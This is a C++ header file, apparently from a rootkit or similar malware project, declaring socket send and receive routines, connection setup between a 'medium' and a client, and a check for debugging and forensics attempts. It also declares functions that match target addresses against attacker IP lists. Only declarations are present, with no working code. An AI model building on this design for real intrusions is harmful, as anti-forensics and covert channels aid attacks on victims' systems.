#pragma once

#include "helpers.h"
#define MAXIPV4_ADDRESS_SIZE 16  // 3 * 4 triple digit numbers + 3 dots + null terminator

BOOL IsQuickTerm(PASS_DATA result);  // function that checks for different debugging and forensics attempts 
namespace root_internet {
	PASS_DATA RecvData(SOCKET GetFrom, int Size, PVOID ToBuf, BOOL Silent, int Flags);  // receive data from socket
	PASS_DATA SendData(SOCKET SendTo, PVOID SrcData, int Size, BOOL Silent, int Flags);  // send data through socket
	NETWORK_INFO InitNetInfo(sockaddr_in AddrInfo, USHORT Port, const char* IP, SOCKET Sock);  // initiate the network info of the medium and the supposed to be client
	int InitConn(NETWORK_INFO Sender, NETWORK_INFO Server, NETWORK_INFO ExpSender);  // initiate the connection with an actual client
	void CleanNetStack(SOCKET sockfrom);  // clean all the sent messages that were not received
	void SetNetStructs(const char* SrvIP, const char* SndIP, USHORT SrvPort, USHORT SndPort, NETWORK_INFO* NetArr);  // set the values of the network structures used for the client and the medium
	int StartComms(NETWORK_INFO* NetArr);  // start the communication process with an actual client
}
namespace address_config {
	DWORD CompareIpAddresses(char* LocalHost, const char* RemoteAddr);
	BOOL MatchIpAddresses(char* TargetAddress, char* AttackerAddress, const char* AttackerIps);
}